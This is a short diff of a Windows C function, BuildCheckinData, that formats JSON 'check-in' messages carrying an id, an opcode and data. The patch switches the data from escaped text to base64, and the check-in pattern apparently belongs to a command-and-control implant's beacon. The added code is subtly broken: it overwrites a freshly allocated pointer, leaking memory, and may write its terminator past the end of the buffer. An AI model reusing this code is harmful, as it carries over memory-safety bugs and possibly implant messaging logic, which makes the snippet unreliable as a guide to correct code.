@@ -287,15 +287,30 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     */
 
     DWORD dwEstSize;
-    CHAR* lpBuffer, *escaped_data = NULL;
+    CHAR* lpBuffer, *encoded_data = NULL;
     
     dwEstSize = lstrlen(Data) + 100;
 
     if (Mode == MODE_CHECKIN_DATA)
     {
-        escaped_data = str_replace(Data, "\n", "\\n");
-        escaped_data = str_replace(escaped_data, "\t", "\\t");
-        lpBuffer     = (CHAR*)malloc(dwEstSize + lstrlen(escaped_data));
+        size_t b64_len_out = (size_t)(dwEstSize * 2);
+
+        encoded_data = (CHAR*)malloc(b64_len_out * 2);
+        if(encoded_data == NULL)
+        {
+            DEBUG("malloc(): FAILED");
+            return NULL;
+        }
+
+        encoded_data = base64_encode((const char*)Data, lstrlen(Data), &b64_len_out);
+        encoded_data[b64_len_out + 1] = '\0';
+
+        lpBuffer = (CHAR*)malloc(dwEstSize + b64_len_out);
+        if (lpBuffer == NULL)
+        {
+            DEBUG("malloc(): FAILED");
+            return NULL;
+        }
     } else
     {
         lpBuffer     = (CHAR*)malloc(dwEstSize);
@@ -317,15 +332,17 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
                 "{\"id\":\"%s\",\"opcode\":%d,\"data\":\"%s\"}", 
                 IdBuffer, 
                 OpCode, 
-                escaped_data
+                encoded_data
             );
 
-            free(escaped_data);
+            free(encoded_data);
 
             break;
         default:
             break;
     }
+
+    // printf("%s\n", lpBuffer);
 
     return (LPCSTR *)lpBuffer;
 }
